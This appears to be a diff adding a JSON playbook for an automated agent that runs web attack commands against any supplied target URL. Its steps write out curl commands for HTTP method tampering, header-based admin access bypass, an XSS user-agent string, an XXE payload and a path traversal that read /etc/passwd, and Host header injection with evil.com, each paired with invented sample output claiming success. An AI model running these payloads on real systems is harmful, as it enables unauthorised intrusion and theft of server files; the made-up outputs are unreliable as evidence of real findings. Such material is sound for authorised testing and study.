@@ -1,0 +1,114 @@
+{
+  "name": "http_request_manipulation_fuzzing",
+  "description": "HTTP request manipulation, header fuzzing, and method tampering for web security testing",
+  "pattern": "http.*manipulate|header.*fuzz|method.*tamper|request.*modify",
+  "parameters": [
+    "target_url",
+    "fuzzing_type"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "for method in GET POST PUT DELETE PATCH OPTIONS TRACE; do echo \"Testing $method:\"; curl -X $method {{target_url}}/api/resource -w 'Status: %{http_code}\\n' -o /dev/null -s; done"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "HTTP Method Tampering Test:\n\nTesting GET:\nStatus: 200\n\nTesting POST:\nStatus: 201\n\nTesting PUT:\nStatus: 200\n\nTesting DELETE:\nStatus: 200  ← Dangerous! DELETE works on GET endpoint\n\nTesting PATCH:\nStatus: 200\n\nTesting OPTIONS:\nStatus: 200\n\nTesting TRACE:\nStatus: 405  ← Method not allowed (good)\n\nVulnerability: DELETE method accepted on resource endpoint\nRisk: Unauthorized data deletion via method override"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl {{target_url}}/admin -H 'X-Original-URL: /admin' -H 'X-Rewrite-URL: /admin' -H 'X-Custom-IP-Authorization: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -v 2>&1 | grep -E 'HTTP/|X-'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "> X-Original-URL: /admin\n> X-Rewrite-URL: /admin\n> X-Custom-IP-Authorization: 127.0.0.1\n> X-Forwarded-Host: localhost\n< HTTP/1.1 200 OK\n< X-Admin-Access: Granted\n\nAccess control bypass via header injection:\n  - X-Original-URL overrode URL-based ACL\n  - X-Custom-IP-Authorization bypassed IP whitelist\n  - Gained admin access without proper authentication"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "for ua in 'Mozilla/5.0' 'curl' 'Python-urllib' 'sqlmap/1.0' 'nmap' '<script>alert(1)</script>'; do echo \"UA: $ua\"; curl {{target_url}} -A \"$ua\" -w 'Status: %{http_code}\\n' -o /dev/null -s; done"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "User-Agent Fuzzing:\n\nUA: Mozilla/5.0\nStatus: 200  ← Normal browser\n\nUA: curl\nStatus: 200  ← Command-line tool allowed\n\nUA: Python-urllib\nStatus: 403  ← Python blocked!\n\nUA: sqlmap/1.0\nStatus: 403  ← Security tool blocked\n\nUA: nmap\nStatus: 403  ← Scanner blocked\n\nUA: <script>alert(1)</script>\nStatus: 200  ← XSS in User-Agent not filtered!\n\nWAF detected: Blocks known security tools\nXSS vulnerability: Malicious User-Agent not sanitized"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl {{target_url}}/api/data -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>' -v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "> POST /api/data HTTP/1.1\n> Content-Type: application/xml\n> \n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<data>&xxe;</data>\n\n< HTTP/1.1 200 OK\n< Content-Type: text/html\n< \n<response>\n  <data>root:x:0:0:root:/root:/bin/bash\n  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</data>\n</response>\n\nXXE (XML External Entity) vulnerability confirmed:\n  - XXE processed external entity\n  - Read /etc/passwd from server\n  - Can read arbitrary files"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl {{target_url}}/api/user -H 'Host: evil.com' -H 'X-Forwarded-Host: evil.com' -H 'Forwarded: host=evil.com' -v 2>&1 | grep -E 'Location:|href='"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "> Host: evil.com\n> X-Forwarded-Host: evil.com\n> Forwarded: host=evil.com\n\n< HTTP/1.1 302 Found\n< Location: http://evil.com/login\n< \n<a href=\"http://evil.com/reset-password\">Reset Password</a>\n<link href=\"http://evil.com/static/css/style.css\" />\n\nHost header injection vulnerability:\n  - Server used injected host header\n  - Generated links point to evil.com\n  - Can be used for password reset poisoning\n  - Risk: Account takeover via poisoned reset links"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl {{target_url}}/download?file=../../../../../../etc/passwd -v 2>&1 | head -20"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "> GET /download?file=../../../../../../etc/passwd HTTP/1.1\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/octet-stream\n< Content-Disposition: attachment; filename=\"passwd\"\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:111:115:MySQL Server:/nonexistent:/bin/false\n\nPath Traversal vulnerability:\n  - Read /etc/passwd via ../ traversal\n  - No input sanitization on file parameter\n  - Can read arbitrary files from server"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
